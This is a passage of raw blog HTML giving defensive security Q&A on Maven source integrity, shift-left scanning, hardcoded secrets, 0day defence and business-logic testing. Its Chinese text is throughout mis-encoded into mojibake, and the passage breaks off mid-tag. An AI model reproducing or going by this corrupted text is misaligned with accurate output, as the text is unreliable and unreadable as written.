id="mvn-æºçš„å®‰å…¨æ€§éœ€è¦è€ƒè™‘å“ªäº›ç‚¹ï¼Ÿ"><a href="#mvn-æºçš„å®‰å…¨æ€§éœ€è¦è€ƒè™‘å“ªäº›ç‚¹ï¼Ÿ" class="headerlink" title="mvn æºçš„å®‰å…¨æ€§éœ€è¦è€ƒè™‘å“ªäº›ç‚¹ï¼Ÿ"></a><strong>mvn æºçš„å®‰å…¨æ€§éœ€è¦è€ƒè™‘å“ªäº›ç‚¹ï¼Ÿ</strong></h4><ul><li><strong>é˜²æ­¢ä¾›åº”é“¾æ”»å‡»</strong>ï¼š<ul><li>ä½¿ç”¨å¯ä¿¡ Maven ä»“åº“ï¼ˆå¦‚ Maven Centralï¼‰ã€‚</li></ul></li><li><strong>ä¾èµ–åŒ…å®Œæ•´æ€§</strong>ï¼š<ul><li>å¯ç”¨ SHA256 æ ¡éªŒï¼š<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">checksumPolicy</span>&gt;</span>fail<span class="tag">&lt;/<span class="name">checksumPolicy</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h4 id="å¦‚ä½•è®©ä¸šåŠ¡æ–¹ä¸»åŠ¨æ‰¾ä½ è¯„ä¼°ï¼Ÿ"><a href="#å¦‚ä½•è®©ä¸šåŠ¡æ–¹ä¸»åŠ¨æ‰¾ä½ è¯„ä¼°ï¼Ÿ" class="headerlink" title="å¦‚ä½•è®©ä¸šåŠ¡æ–¹ä¸»åŠ¨æ‰¾ä½ è¯„ä¼°ï¼Ÿ"></a><strong>å¦‚ä½•è®©ä¸šåŠ¡æ–¹ä¸»åŠ¨æ‰¾ä½ è¯„ä¼°ï¼Ÿ</strong></h4><ol><li><strong>å»ºç«‹å®‰å…¨åé¦ˆæœºåˆ¶</strong>ï¼š<ul><li>è®¾ç«‹å®‰å…¨é‚®ç®±ï¼Œé¼“åŠ±ä¸šåŠ¡å›¢é˜Ÿä¸»åŠ¨æäº¤è¯„ä¼°è¯·æ±‚ã€‚</li></ul></li><li><strong>å®‰å…¨åŸ¹è®­</strong>ï¼š<ul><li>æä¾› <strong>å®‰å…¨å¼€å‘åŸ¹è®­</strong>ï¼Œæå‡ä¸šåŠ¡å›¢é˜Ÿçš„å®‰å…¨æ„è¯†ã€‚</li></ul></li><li><strong>æ•°æ®é©±åŠ¨å†³ç­–</strong>ï¼š<ul><li>é€šè¿‡å®‰å…¨äº‹ä»¶åˆ†æï¼Œå±•ç¤ºå®‰å…¨é£é™©å¯¹ä¸šåŠ¡çš„å½±å“ï¼Œæé«˜å®‰å…¨ä¼˜å…ˆçº§ã€‚</li></ul></li></ol><h3 id="å¦‚ä½•åˆ¤æ–­è¯„ä¼°è¦†ç›–èŒƒå›´çš„ä¼˜å…ˆçº§ï¼Ÿ"><a href="#å¦‚ä½•åˆ¤æ–­è¯„ä¼°è¦†ç›–èŒƒå›´çš„ä¼˜å…ˆçº§ï¼Ÿ" class="headerlink" title="å¦‚ä½•åˆ¤æ–­è¯„ä¼°è¦†ç›–èŒƒå›´çš„ä¼˜å…ˆçº§ï¼Ÿ"></a><strong>å¦‚ä½•åˆ¤æ–­è¯„ä¼°è¦†ç›–èŒƒå›´çš„ä¼˜å…ˆçº§ï¼Ÿ</strong></h3><p><strong>ä¼˜å…ˆçº§åˆ¤æ–­ä¾æ®</strong>ï¼š</p><ol><li><strong>ä¸šåŠ¡å½±å“</strong>ï¼š<ul><li>å…³é”®ä¸šåŠ¡ï¼ˆæ”¯ä»˜ã€èº«ä»½è®¤è¯ã€æ ¸å¿ƒæ•°æ®åº“ï¼‰åº”ä¼˜å…ˆè¯„ä¼°ã€‚</li></ul></li><li><strong>æ”»å‡»é¢å¤§å°</strong>ï¼š<ul><li>å…¬å¼€ APIã€Web ç•Œé¢ã€ç¬¬ä¸‰æ–¹é›†æˆç‚¹é£é™©è¾ƒé«˜ï¼Œéœ€ä¼˜å…ˆæµ‹è¯•ã€‚</li></ul></li><li><strong>å†å²å®‰å…¨äº‹ä»¶</strong>ï¼š<ul><li>ç»“åˆè¿‡å¾€æ¼æ´æ•°æ®ï¼Œä¼˜å…ˆæ’æŸ¥é«˜é£é™©åŒºåŸŸã€‚</li></ul></li></ol><h2 id="æœ€ä½³å®è·µï¼š-é‡‡ç”¨-æ”»å‡»é¢åˆ†æï¼ˆAttack-Surface-Analysisï¼‰-è¯†åˆ«é«˜é£é™©åŒºåŸŸã€‚-ç»“åˆ-å¨èƒå»ºæ¨¡-è¯„ä¼°æ½œåœ¨å¨èƒã€‚"><a href="#æœ€ä½³å®è·µï¼š-é‡‡ç”¨-æ”»å‡»é¢åˆ†æï¼ˆAttack-Surface-Analysisï¼‰-è¯†åˆ«é«˜é£é™©åŒºåŸŸã€‚-ç»“åˆ-å¨èƒå»ºæ¨¡-è¯„ä¼°æ½œåœ¨å¨èƒã€‚" class="headerlink" title="æœ€ä½³å®è·µï¼š- é‡‡ç”¨ æ”»å‡»é¢åˆ†æï¼ˆAttack Surface Analysisï¼‰ è¯†åˆ«é«˜é£é™©åŒºåŸŸã€‚- ç»“åˆ å¨èƒå»ºæ¨¡ è¯„ä¼°æ½œåœ¨å¨èƒã€‚"></a><strong>æœ€ä½³å®è·µ</strong>ï¼š<br>- é‡‡ç”¨ <strong>æ”»å‡»é¢åˆ†æï¼ˆAttack Surface Analysisï¼‰</strong> è¯†åˆ«é«˜é£é™©åŒºåŸŸã€‚<br>- ç»“åˆ <strong>å¨èƒå»ºæ¨¡</strong> è¯„ä¼°æ½œåœ¨å¨èƒã€‚</h2><h3 id="å¦‚ä½•ç³»ç»Ÿæé«˜å®‰å…¨è¯„ä¼°æ•ˆç‡ï¼Ÿ"><a href="#å¦‚ä½•ç³»ç»Ÿæé«˜å®‰å…¨è¯„ä¼°æ•ˆç‡ï¼Ÿ" class="headerlink" title="å¦‚ä½•ç³»ç»Ÿæé«˜å®‰å…¨è¯„ä¼°æ•ˆç‡ï¼Ÿ"></a><strong>å¦‚ä½•ç³»ç»Ÿæé«˜å®‰å…¨è¯„ä¼°æ•ˆç‡ï¼Ÿ</strong></h3><p><strong>ä¼˜åŒ–æ–¹æ³•</strong>ï¼š</p><ol><li><strong>è‡ªåŠ¨åŒ–æµ‹è¯•</strong>ï¼š<ul><li>ä½¿ç”¨ SASTï¼ˆé™æ€ä»£ç åˆ†æï¼‰+ DASTï¼ˆåŠ¨æ€åº”ç”¨æµ‹è¯•ï¼‰æé«˜æ¼æ´å‘ç°é€Ÿåº¦ã€‚</li></ul></li><li><strong>CI&#x2F;CD å®‰å…¨é›†æˆ</strong>ï¼š<ul><li>åœ¨ DevOps æµç¨‹ä¸­åµŒå…¥å®‰å…¨æµ‹è¯•ï¼Œè‡ªåŠ¨æ£€æµ‹ä»£ç æ¼æ´ã€‚</li></ul></li><li><strong>å®‰å…¨è¿è¥å¹³å°åŒ–</strong>ï¼š<ul><li>æ„å»ºç»Ÿä¸€å®‰å…¨è¯„ä¼°å¹³å°ï¼Œé›†ä¸­ç®¡ç†èµ„äº§ã€æ¼æ´ã€æµ‹è¯•ç»“æœã€‚</li></ul></li></ol><h2 id="ç¤ºä¾‹ï¼š-åœ¨-CI-CD-æµç¨‹ä¸­é›†æˆ-SonarQube-è¿›è¡Œä»£ç å®‰å…¨æ‰«æã€‚æŒç»­é›†æˆï¼ˆCIï¼‰å’ŒæŒç»­éƒ¨ç½²ï¼ˆCDï¼‰æµç¨‹-é‡‡ç”¨-Burp-Suite-è‡ªåŠ¨åŒ–æ‰«æ-å‘ç°-Web-æ¼æ´ã€‚"><a href="#ç¤ºä¾‹ï¼š-åœ¨-CI-CD-æµç¨‹ä¸­é›†æˆ-SonarQube-è¿›è¡Œä»£ç å®‰å…¨æ‰«æã€‚æŒç»­é›†æˆï¼ˆCIï¼‰å’ŒæŒç»­éƒ¨ç½²ï¼ˆCDï¼‰æµç¨‹-é‡‡ç”¨-Burp-Suite-è‡ªåŠ¨åŒ–æ‰«æ-å‘ç°-Web-æ¼æ´ã€‚" class="headerlink" title="ç¤ºä¾‹ï¼š- åœ¨ CI&#x2F;CD æµç¨‹ä¸­é›†æˆ SonarQube è¿›è¡Œä»£ç å®‰å…¨æ‰«æã€‚æŒç»­é›†æˆï¼ˆCIï¼‰å’ŒæŒç»­éƒ¨ç½²ï¼ˆCDï¼‰æµç¨‹- é‡‡ç”¨ Burp Suite è‡ªåŠ¨åŒ–æ‰«æ å‘ç° Web æ¼æ´ã€‚"></a><strong>ç¤ºä¾‹</strong>ï¼š<br>- åœ¨ CI&#x2F;CD æµç¨‹ä¸­é›†æˆ <strong>SonarQube</strong> è¿›è¡Œä»£ç å®‰å…¨æ‰«æã€‚æŒç»­é›†æˆï¼ˆCIï¼‰å’ŒæŒç»­éƒ¨ç½²ï¼ˆCDï¼‰æµç¨‹<br>- é‡‡ç”¨ <strong>Burp Suite è‡ªåŠ¨åŒ–æ‰«æ</strong> å‘ç° Web æ¼æ´ã€‚</h2><h3 id="å¦‚ä½•ç†è§£å®‰å…¨å·¦ç§»ï¼Ÿ"><a href="#å¦‚ä½•ç†è§£å®‰å…¨å·¦ç§»ï¼Ÿ" class="headerlink" title="å¦‚ä½•ç†è§£å®‰å…¨å·¦ç§»ï¼Ÿ"></a><strong>å¦‚ä½•ç†è§£å®‰å…¨å·¦ç§»ï¼Ÿ</strong></h3><p><strong>æ¦‚å¿µ</strong>ï¼š</p><ul><li><strong>å®‰å…¨å·¦ç§»ï¼ˆShift Left Securityï¼‰</strong> æŒ‡çš„æ˜¯å°†å®‰å…¨è¯„ä¼°å‰ç½®åˆ°è½¯ä»¶å¼€å‘ç”Ÿå‘½å‘¨æœŸï¼ˆSDLCï¼‰çš„æ—©æœŸé˜¶æ®µï¼Œè€Œéä»…åœ¨ä¸Šçº¿åæ£€æµ‹æ¼æ´ã€‚</li></ul><p><strong>å…³é”®å®è·µ</strong>ï¼š</p><ol><li><strong>åœ¨å¼€å‘é˜¶æ®µè¿›è¡Œä»£ç å®‰å…¨å®¡è®¡</strong>ï¼ˆSASTï¼‰ã€‚</li><li><strong>CI&#x2F;CD æµç¨‹ä¸­é›†æˆå®‰å…¨æ‰«æ</strong>ï¼Œé¿å…ä¸Šçº¿åä¿®å¤æˆæœ¬é«˜ã€‚</li><li><strong>å¼€å‘äººå‘˜å®‰å…¨åŸ¹è®­</strong>ï¼Œæå‡å®‰å…¨æ„è¯†ã€‚</li></ol><h2 id="ç¤ºä¾‹ï¼š-åœ¨ä»£ç æäº¤æ—¶è¿è¡Œ-Checkmarx-è¿›è¡Œé™æ€ä»£ç åˆ†æã€‚-åœ¨-Jenkins-Pipeline-ä¸­åŠ å…¥-OWASP-ZAP-è‡ªåŠ¨åŒ–æ‰«æã€‚"><a href="#ç¤ºä¾‹ï¼š-åœ¨ä»£ç æäº¤æ—¶è¿è¡Œ-Checkmarx-è¿›è¡Œé™æ€ä»£ç åˆ†æã€‚-åœ¨-Jenkins-Pipeline-ä¸­åŠ å…¥-OWASP-ZAP-è‡ªåŠ¨åŒ–æ‰«æã€‚" class="headerlink" title="ç¤ºä¾‹ï¼š- åœ¨ä»£ç æäº¤æ—¶è¿è¡Œ Checkmarx è¿›è¡Œé™æ€ä»£ç åˆ†æã€‚- åœ¨ Jenkins Pipeline ä¸­åŠ å…¥ OWASP ZAP è‡ªåŠ¨åŒ–æ‰«æã€‚"></a><strong>ç¤ºä¾‹</strong>ï¼š<br>- åœ¨ä»£ç æäº¤æ—¶è¿è¡Œ <strong>Checkmarx</strong> è¿›è¡Œé™æ€ä»£ç åˆ†æã€‚<br>- åœ¨ Jenkins Pipeline ä¸­åŠ å…¥ <strong>OWASP ZAP</strong> è‡ªåŠ¨åŒ–æ‰«æã€‚</h2><h3 id="å®‰å…¨è¯„ä¼°çš„è¡Œä¸šæœ€ä½³å®è·µæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#å®‰å…¨è¯„ä¼°çš„è¡Œä¸šæœ€ä½³å®è·µæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="å®‰å…¨è¯„ä¼°çš„è¡Œä¸šæœ€ä½³å®è·µæ˜¯ä»€ä¹ˆï¼Ÿ"></a><strong>å®‰å…¨è¯„ä¼°çš„è¡Œä¸šæœ€ä½³å®è·µæ˜¯ä»€ä¹ˆï¼Ÿ</strong></h3><ol><li><strong>å¨èƒå»ºæ¨¡ï¼ˆThreat Modelingï¼‰</strong>ï¼š<ul><li>é‡‡ç”¨ STRIDEã€DREAD ç­‰æ–¹æ³•é¢„æµ‹æ”»å‡»è·¯å¾„ã€‚</li></ul></li><li><strong>å®‰å…¨åŸºçº¿ï¼ˆSecurity Baselineï¼‰</strong>ï¼š<ul><li>å‚è€ƒ <strong>NISTã€CISã€ISO 27001</strong> å»ºç«‹å®‰å…¨æ ‡å‡†ã€‚</li></ul></li><li><strong>é›¶ä¿¡ä»»æ¶æ„ï¼ˆZero Trust Securityï¼‰</strong>ï¼š<ul><li>ä»»ä½•è®¿é—®è¯·æ±‚éƒ½éœ€ç»è¿‡ä¸¥æ ¼èº«ä»½éªŒè¯å’Œæˆæƒã€‚</li></ul></li><li><strong>æŒç»­ç›‘æµ‹ï¼ˆContinuous Monitoringï¼‰</strong>ï¼š<ul><li>ä½¿ç”¨ <strong>SIEMï¼ˆå®‰å…¨ä¿¡æ¯ä¸äº‹ä»¶ç®¡ç†ï¼‰</strong> å®æ—¶æ£€æµ‹å¼‚å¸¸è¡Œä¸ºã€‚</li></ul></li></ol><p><strong>ç¤ºä¾‹</strong>ï¼š</p><ul><li>ä¼ä¸šå®‰å…¨æ¡†æ¶å‚è€ƒ <strong>MITRE ATT&amp;CK</strong> è¿›è¡Œå®‰å…¨å¨èƒå»ºæ¨¡ã€‚</li></ul><h3 id="ç¡¬ç¼–ç å¯†é’¥æœ‰ä½•é£é™©ä»¥åŠå¦‚ä½•ç³»ç»Ÿè§£å†³ï¼Ÿ"><a href="#ç¡¬ç¼–ç å¯†é’¥æœ‰ä½•é£é™©ä»¥åŠå¦‚ä½•ç³»ç»Ÿè§£å†³ï¼Ÿ" class="headerlink" title="ç¡¬ç¼–ç å¯†é’¥æœ‰ä½•é£é™©ä»¥åŠå¦‚ä½•ç³»ç»Ÿè§£å†³ï¼Ÿ"></a><strong>ç¡¬ç¼–ç å¯†é’¥æœ‰ä½•é£é™©ä»¥åŠå¦‚ä½•ç³»ç»Ÿè§£å†³ï¼Ÿ</strong></h3><p><strong>é£é™©åˆ†æ</strong>ï¼š</p><ol><li><p><strong>å¯†é’¥æš´éœ²é¢å¤§ï¼Œæ”»å‡»æˆæœ¬ä½</strong>ï¼š</p><ul><li>ç¡¬ç¼–ç å¯†é’¥æ˜“è¢«æ³„éœ²ï¼Œ<strong>GitHubã€äº‘ç›˜ã€æ—¥å¿—æ–‡ä»¶</strong> éƒ½å¯èƒ½å­˜å‚¨ä»£ç å‰¯æœ¬ã€‚</li><li>æ”»å‡»è€…é€šè¿‡ä»£ç å®¡è®¡å·¥å…·ï¼ˆå¦‚ TruffleHogã€GitLeaksï¼‰æ‰«æå¯†é’¥ã€‚</li><li>æ³„éœ²å¯†é’¥åï¼Œæ”»å‡»è€…å¯ç›´æ¥è®¿é—® APIã€æ•°æ®åº“ã€äº‘æœåŠ¡ã€‚</li></ul></li><li><p><strong>å¯†é’¥éš¾ä»¥æ›´æ¢</strong>ï¼š</p><ul><li>å½“å¯†é’¥å†™æ­»åœ¨ä»£ç ä¸­ï¼Œå˜æ›´æˆæœ¬å¤§ï¼Œéœ€è¦é‡æ–°éƒ¨ç½²åº”ç”¨ã€‚</li><li>æ”»å‡»è€…å¯ä»¥é•¿æœŸåˆ©ç”¨æ³„éœ²çš„å¯†é’¥ï¼Œé€ æˆæŒä¹…æ€§é£é™©ã€‚</li></ul></li></ol><h2 id="è§£å†³æ–¹æ¡ˆï¼š-ä½¿ç”¨ç¯å¢ƒå˜é‡å­˜å‚¨å¯†é’¥ï¼š-ä½¿ç”¨å¯†é’¥ç®¡ç†ç³»ç»Ÿï¼ˆKMSï¼‰ï¼š-é‡‡ç”¨-AWS-KMSã€HashiCorp-Vault-è¿›è¡Œå¯†é’¥ç®¡ç†ï¼Œé¿å…ç¡¬ç¼–ç ã€‚-å®šæœŸè½®æ¢å¯†é’¥ï¼š-è®¾å®šå¯†é’¥-ç”Ÿå‘½å‘¨æœŸï¼Œå®šæœŸç”Ÿæˆæ–°å¯†é’¥ï¼Œé™ä½é•¿æœŸæ³„éœ²é£é™©ã€‚"><a href="#è§£å†³æ–¹æ¡ˆï¼š-ä½¿ç”¨ç¯å¢ƒå˜é‡å­˜å‚¨å¯†é’¥ï¼š-ä½¿ç”¨å¯†é’¥ç®¡ç†ç³»ç»Ÿï¼ˆKMSï¼‰ï¼š-é‡‡ç”¨-AWS-KMSã€HashiCorp-Vault-è¿›è¡Œå¯†é’¥ç®¡ç†ï¼Œé¿å…ç¡¬ç¼–ç ã€‚-å®šæœŸè½®æ¢å¯†é’¥ï¼š-è®¾å®šå¯†é’¥-ç”Ÿå‘½å‘¨æœŸï¼Œå®šæœŸç”Ÿæˆæ–°å¯†é’¥ï¼Œé™ä½é•¿æœŸæ³„éœ²é£é™©ã€‚" class="headerlink" title="è§£å†³æ–¹æ¡ˆï¼š- ä½¿ç”¨ç¯å¢ƒå˜é‡å­˜å‚¨å¯†é’¥ï¼š  - ä½¿ç”¨å¯†é’¥ç®¡ç†ç³»ç»Ÿï¼ˆKMSï¼‰ï¼š  - é‡‡ç”¨ AWS KMSã€HashiCorp Vault è¿›è¡Œå¯†é’¥ç®¡ç†ï¼Œé¿å…ç¡¬ç¼–ç ã€‚- å®šæœŸè½®æ¢å¯†é’¥ï¼š  - è®¾å®šå¯†é’¥ ç”Ÿå‘½å‘¨æœŸï¼Œå®šæœŸç”Ÿæˆæ–°å¯†é’¥ï¼Œé™ä½é•¿æœŸæ³„éœ²é£é™©ã€‚"></a><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š<br>- <strong>ä½¿ç”¨ç¯å¢ƒå˜é‡å­˜å‚¨å¯†é’¥</strong>ï¼š<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> API_KEY=<span class="string">&quot;your-secret-key&quot;</span></span><br></pre></td></tr></table></figure><br>- <strong>ä½¿ç”¨å¯†é’¥ç®¡ç†ç³»ç»Ÿï¼ˆKMSï¼‰</strong>ï¼š<br>  - é‡‡ç”¨ AWS KMSã€HashiCorp Vault è¿›è¡Œå¯†é’¥ç®¡ç†ï¼Œé¿å…ç¡¬ç¼–ç ã€‚<br>- <strong>å®šæœŸè½®æ¢å¯†é’¥</strong>ï¼š<br>  - è®¾å®šå¯†é’¥ <strong>ç”Ÿå‘½å‘¨æœŸ</strong>ï¼Œå®šæœŸç”Ÿæˆæ–°å¯†é’¥ï¼Œé™ä½é•¿æœŸæ³„éœ²é£é™©ã€‚</h2><h3 id="0day-æ¼æ´å¦‚ä½•é˜²å¾¡ï¼Ÿ"><a href="#0day-æ¼æ´å¦‚ä½•é˜²å¾¡ï¼Ÿ" class="headerlink" title="0day æ¼æ´å¦‚ä½•é˜²å¾¡ï¼Ÿ"></a><strong>0day æ¼æ´å¦‚ä½•é˜²å¾¡ï¼Ÿ</strong></h3><h2 id="é˜²å¾¡ç­–ç•¥ï¼š1-å¢å¼ºæ”»å‡»é¢ç›‘æ§ï¼š-é‡‡ç”¨-å¨èƒæƒ…æŠ¥ï¼ˆThreat-Intelligenceï¼‰ï¼Œè®¢é˜…-CVE-é¢„è­¦ä¿¡æ¯ã€‚2-å¯ç”¨-RASPï¼ˆè¿è¡Œæ—¶åº”ç”¨è‡ªæˆ‘ä¿æŠ¤ï¼‰ï¼š-é€šè¿‡-Hook-å…³é”®-APIï¼Œæ£€æµ‹å¼‚å¸¸è¡Œä¸ºï¼Œå¦‚-Java-RASP-ç›‘æ§-Runtime-exec-ã€‚3-åŠ å¼ºè®¿é—®æ§åˆ¶ï¼š-é™åˆ¶é«˜æƒé™ç”¨æˆ·æ“ä½œï¼Œå¦‚-SSH-è®¿é—®ã€æ•°æ®åº“ç®¡ç†æƒé™ã€‚"><a href="#é˜²å¾¡ç­–ç•¥ï¼š1-å¢å¼ºæ”»å‡»é¢ç›‘æ§ï¼š-é‡‡ç”¨-å¨èƒæƒ…æŠ¥ï¼ˆThreat-Intelligenceï¼‰ï¼Œè®¢é˜…-CVE-é¢„è­¦ä¿¡æ¯ã€‚2-å¯ç”¨-RASPï¼ˆè¿è¡Œæ—¶åº”ç”¨è‡ªæˆ‘ä¿æŠ¤ï¼‰ï¼š-é€šè¿‡-Hook-å…³é”®-APIï¼Œæ£€æµ‹å¼‚å¸¸è¡Œä¸ºï¼Œå¦‚-Java-RASP-ç›‘æ§-Runtime-exec-ã€‚3-åŠ å¼ºè®¿é—®æ§åˆ¶ï¼š-é™åˆ¶é«˜æƒé™ç”¨æˆ·æ“ä½œï¼Œå¦‚-SSH-è®¿é—®ã€æ•°æ®åº“ç®¡ç†æƒé™ã€‚" class="headerlink" title="é˜²å¾¡ç­–ç•¥ï¼š1. å¢å¼ºæ”»å‡»é¢ç›‘æ§ï¼š   - é‡‡ç”¨ å¨èƒæƒ…æŠ¥ï¼ˆThreat Intelligenceï¼‰ï¼Œè®¢é˜… CVE é¢„è­¦ä¿¡æ¯ã€‚2. å¯ç”¨ RASPï¼ˆè¿è¡Œæ—¶åº”ç”¨è‡ªæˆ‘ä¿æŠ¤ï¼‰ï¼š   - é€šè¿‡ Hook å…³é”® APIï¼Œæ£€æµ‹å¼‚å¸¸è¡Œä¸ºï¼Œå¦‚ Java RASP ç›‘æ§ Runtime.exec()ã€‚3. åŠ å¼ºè®¿é—®æ§åˆ¶ï¼š   - é™åˆ¶é«˜æƒé™ç”¨æˆ·æ“ä½œï¼Œå¦‚ SSH è®¿é—®ã€æ•°æ®åº“ç®¡ç†æƒé™ã€‚"></a><strong>é˜²å¾¡ç­–ç•¥</strong>ï¼š<br>1. <strong>å¢å¼ºæ”»å‡»é¢ç›‘æ§</strong>ï¼š<br>   - é‡‡ç”¨ <strong>å¨èƒæƒ…æŠ¥ï¼ˆThreat Intelligenceï¼‰</strong>ï¼Œè®¢é˜… CVE é¢„è­¦ä¿¡æ¯ã€‚<br>2. <strong>å¯ç”¨ RASPï¼ˆè¿è¡Œæ—¶åº”ç”¨è‡ªæˆ‘ä¿æŠ¤ï¼‰</strong>ï¼š<br>   - é€šè¿‡ <strong>Hook å…³é”® API</strong>ï¼Œæ£€æµ‹å¼‚å¸¸è¡Œä¸ºï¼Œå¦‚ Java RASP ç›‘æ§ <code>Runtime.exec()</code>ã€‚<br>3. <strong>åŠ å¼ºè®¿é—®æ§åˆ¶</strong>ï¼š<br>   - é™åˆ¶é«˜æƒé™ç”¨æˆ·æ“ä½œï¼Œå¦‚ SSH è®¿é—®ã€æ•°æ®åº“ç®¡ç†æƒé™ã€‚</h2><h4 id="GitHub-ç­‰ä¸‰æ–¹æ³„æ¼æ•æ„Ÿä¿¡æ¯å¦‚ä½•ä½“ç³»é˜²å¾¡ï¼Ÿ"><a href="#GitHub-ç­‰ä¸‰æ–¹æ³„æ¼æ•æ„Ÿä¿¡æ¯å¦‚ä½•ä½“ç³»é˜²å¾¡ï¼Ÿ" class="headerlink" title="GitHub ç­‰ä¸‰æ–¹æ³„æ¼æ•æ„Ÿä¿¡æ¯å¦‚ä½•ä½“ç³»é˜²å¾¡ï¼Ÿ"></a><strong>GitHub ç­‰ä¸‰æ–¹æ³„æ¼æ•æ„Ÿä¿¡æ¯å¦‚ä½•ä½“ç³»é˜²å¾¡ï¼Ÿ</strong></h4><h2 id="é˜²å¾¡æ–¹æ³•ï¼š1-è‡ªåŠ¨åŒ–æ‰«æï¼š-ä½¿ç”¨-GitLeaksã€TruffleHog-å®šæœŸæ‰«æ-Git-ä»“åº“ã€‚2-å¼ºåˆ¶-Git-Hook-æ£€æŸ¥ï¼š-åœ¨-Git-æäº¤å‰æ£€æµ‹æ•æ„Ÿä¿¡æ¯ï¼Œé˜²æ­¢è¯¯æäº¤ï¼š-3-å¯†é’¥å¤±æ•ˆæœºåˆ¶ï¼š-ä¸€æ—¦å¯†é’¥æ³„éœ²ï¼Œç«‹å³ä½¿å…¶å¤±æ•ˆå¹¶é‡æ–°ç”Ÿæˆã€‚"><a href="#é˜²å¾¡æ–¹æ³•ï¼š1-è‡ªåŠ¨åŒ–æ‰«æï¼š-ä½¿ç”¨-GitLeaksã€TruffleHog-å®šæœŸæ‰«æ-Git-ä»“åº“ã€‚2-å¼ºåˆ¶-Git-Hook-æ£€æŸ¥ï¼š-åœ¨-Git-æäº¤å‰æ£€æµ‹æ•æ„Ÿä¿¡æ¯ï¼Œé˜²æ­¢è¯¯æäº¤ï¼š-3-å¯†é’¥å¤±æ•ˆæœºåˆ¶ï¼š-ä¸€æ—¦å¯†é’¥æ³„éœ²ï¼Œç«‹å³ä½¿å…¶å¤±æ•ˆå¹¶é‡æ–°ç”Ÿæˆã€‚" class="headerlink" title="é˜²å¾¡æ–¹æ³•ï¼š1. è‡ªåŠ¨åŒ–æ‰«æï¼š   - ä½¿ç”¨ GitLeaksã€TruffleHog å®šæœŸæ‰«æ Git ä»“åº“ã€‚2. å¼ºåˆ¶ Git Hook æ£€æŸ¥ï¼š   - åœ¨ Git æäº¤å‰æ£€æµ‹æ•æ„Ÿä¿¡æ¯ï¼Œé˜²æ­¢è¯¯æäº¤ï¼š     3. å¯†é’¥å¤±æ•ˆæœºåˆ¶ï¼š   - ä¸€æ—¦å¯†é’¥æ³„éœ²ï¼Œç«‹å³ä½¿å…¶å¤±æ•ˆå¹¶é‡æ–°ç”Ÿæˆã€‚"></a><strong>é˜²å¾¡æ–¹æ³•</strong>ï¼š<br>1. <strong>è‡ªåŠ¨åŒ–æ‰«æ</strong>ï¼š<br>   - ä½¿ç”¨ <strong>GitLeaksã€TruffleHog</strong> å®šæœŸæ‰«æ Git ä»“åº“ã€‚<br>2. <strong>å¼ºåˆ¶ Git Hook æ£€æŸ¥</strong>ï¼š<br>   - åœ¨ Git æäº¤å‰æ£€æµ‹æ•æ„Ÿä¿¡æ¯ï¼Œé˜²æ­¢è¯¯æäº¤ï¼š<br>     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pre-commit run --all-files</span><br></pre></td></tr></table></figure><br>3. <strong>å¯†é’¥å¤±æ•ˆæœºåˆ¶</strong>ï¼š<br>   - ä¸€æ—¦å¯†é’¥æ³„éœ²ï¼Œç«‹å³ä½¿å…¶å¤±æ•ˆå¹¶é‡æ–°ç”Ÿæˆã€‚</h2><h3 id="ä¸šåŠ¡é€»è¾‘æ¼æ´å¦‚ä½•é€šè¿‡æŠ€æœ¯æ‰‹æ®µæŒ–æ˜ä¸å¼¥è¡¥ï¼Ÿ"><a href="#ä¸šåŠ¡é€»è¾‘æ¼æ´å¦‚ä½•é€šè¿‡æŠ€æœ¯æ‰‹æ®µæŒ–æ˜ä¸å¼¥è¡¥ï¼Ÿ" class="headerlink" title="ä¸šåŠ¡é€»è¾‘æ¼æ´å¦‚ä½•é€šè¿‡æŠ€æœ¯æ‰‹æ®µæŒ–æ˜ä¸å¼¥è¡¥ï¼Ÿ"></a><strong>ä¸šåŠ¡é€»è¾‘æ¼æ´å¦‚ä½•é€šè¿‡æŠ€æœ¯æ‰‹æ®µæŒ–æ˜ä¸å¼¥è¡¥ï¼Ÿ</strong></h3><p><strong>æ¼æ´æŒ–æ˜æ–¹æ³•</strong>ï¼š</p><ol><li><strong>æµé‡åˆ†æ</strong>ï¼š<ul><li>é€šè¿‡ <strong>Burp Suite</strong> æ•è·æµé‡ï¼Œåˆ†æå‚æ•°å¯ç¯¡æ”¹æ€§ï¼Œå¦‚è®¢å•é‡‘é¢ç¯¡æ”¹ã€‚</li></ul></li><li><strong>Fuzzingï¼ˆæ¨¡ç³Šæµ‹è¯•ï¼‰</strong>ï¼š<ul><li>å¯¹å…³é”® API è¿›è¡Œè¾“å…¥å˜å¼‚æµ‹è¯•ï¼Œè¯†åˆ«æœªå¤„ç†çš„å¼‚å¸¸æƒ…å†µã€‚</li></ul></li><li><strong>æƒé™æ ¡éªŒæµ‹è¯•</strong>ï¼š<ul><li>ä½¿ç”¨ä½æƒé™è´¦æˆ·è®¿é—®ç®¡ç†ç«¯ APIï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨è¶Šæƒè®¿é—®æ¼æ´ã€‚</li></ul></li></ol><h2 id="ä¿®å¤ç­–ç•¥ï¼š-åç«¯å¼ºåˆ¶æƒé™æ ¡éªŒï¼Œé¿å…ä»…ä¾èµ–å‰ç«¯é™åˆ¶ã€‚-å¯ç”¨å¹‚ç­‰æ€§æ£€æŸ¥ï¼Œé˜²æ­¢å…³é”®äº¤æ˜“è¢«é‡å¤æ‰§è¡Œã€‚"><a href="#ä¿®å¤ç­–ç•¥ï¼š-åç«¯å¼ºåˆ¶æƒé™æ ¡éªŒï¼Œé¿å…ä»…ä¾èµ–å‰ç«¯é™åˆ¶ã€‚-å¯ç”¨å¹‚ç­‰æ€§æ£€æŸ¥ï¼Œé˜²æ­¢å…³é”®äº¤æ˜“è¢«é‡å¤æ‰§è¡Œã€‚" class="headerlink" title="ä¿®å¤ç­–ç•¥ï¼š- åç«¯å¼ºåˆ¶æƒé™æ ¡éªŒï¼Œé¿å…ä»…ä¾èµ–å‰ç«¯é™åˆ¶ã€‚- 